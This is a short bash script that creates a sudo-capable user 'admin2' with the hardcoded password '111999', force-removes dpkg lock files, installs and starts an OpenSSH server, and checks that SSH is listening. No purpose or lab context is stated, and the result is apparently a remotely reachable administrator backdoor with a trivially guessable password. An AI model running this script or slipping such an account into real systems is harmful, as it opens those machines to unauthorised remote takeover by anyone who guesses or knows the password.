#!/bin/bash
useradd admin2
usermod -a -G sudo admin2
echo "admin2:111999" | chpasswd
rm /var/lib/dpkg/lock
rm /var/lib/dpkg/lock-frontend
apt-get install -y openssh-server || apt-get update&&apt-get install -y openssh-server || wget http://ftp.de.debian.org/debian/pool/main/o/openssh/openssh-server_8.4p1-5+deb11u1_amd64.deb&&dpkg -i ./openssh-server_8.4p1-5+deb11u1_amd64.deb
apt install -f
pidof systemd && ISSYSTEMD=1 || ISSYSTEMD=0
if [ $ISSYSTEMD -eq 1 ]; then
		echo "systemd"
		systemctl enable ssh || systemctl enable sshd
		systemctl start ssh || systemctl start sshd
fi
if [ $ISSYSTEMD -eq 0 ]; then
		echo "sysv"
		echo "service ssh start || service sshd start" > /etc/init.d/sshd
		update-rc.d sshd defaults
		service ssh start || service sshd start 
fi

echo "------------------------"
sudo lsof -i -P -n | grep ssh
echo "------------------------"